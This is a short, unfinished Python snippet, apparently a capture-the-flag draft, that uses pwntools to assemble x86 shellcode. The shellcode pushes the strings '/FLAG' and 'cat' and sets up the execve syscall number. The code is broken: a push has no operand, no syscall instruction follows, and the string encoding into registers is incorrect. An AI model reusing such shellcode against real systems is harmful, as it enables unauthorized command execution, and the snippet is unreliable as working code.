from pwn import *

code=f"""
mov eax, 0x00
push eax
mov eax, 0x{'/FLAG'.encode().hex()}
push eax
mov eax, 0x{'cat'.encode().hex()}
push eax
push 
mov eax, 0x3b

"""